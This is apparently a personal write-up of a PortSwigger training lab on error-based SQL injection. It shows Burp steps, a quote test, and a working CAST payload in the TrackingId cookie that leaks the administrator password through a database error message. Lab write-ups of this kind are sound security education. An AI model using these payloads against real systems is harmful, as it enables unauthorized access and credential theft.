
# #PortSwigger 


![[Pasted image 20251213013607.png]]


## Lab Description

This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

**Objective:** Leak the password for the administrator user by triggering verbose error messages, then log in to their account.

---
---


### Step 1: Capture the Request

1. In Burp's browser, access the lab
2. In Burp Proxy, find the `GET /` request containing the `TrackingId` cookie
3. Send it to Repeater

**Example request:**
```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: TrackingId=2Aqx0cGfIRNHe2tUi; session=...
```


---

### Step 2: Confirm Injection with a Single Quote

**Payload:**
```
TrackingId=2Aqx0cGfIRNHe2tUi'
```


**Response (from screenshot):**
```
Unterminated string literal started at position 52 in SQL
SELECT * FROM tracking WHERE id = '2Aqx0cGfIRNHe2tUi'. Expected char
```

![[Pasted image 20251213013858.png]]

- Injection confirmed.


---

### Step 3: Retrieve Password

**Payload:**
```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Response**
![[Pasted image 20251213014512.png]]

*From Screenshots*
```
ERROR: invalid input syntax for type integer: "175kn2mquxkb4uvbydag"
```
- The password is leaked in the error message.


---

### Step 9: Log In as Administrator

1. Go to the login page
2. Username: `administrator`
3. Password: `175kn2mquxkb4uvbydag`
4. Click **Log in**


![[Pasted image 20251213014538.png]]


---

### Step 10: Lab Solved

![[Pasted image 20251213014555.png]]


---
---
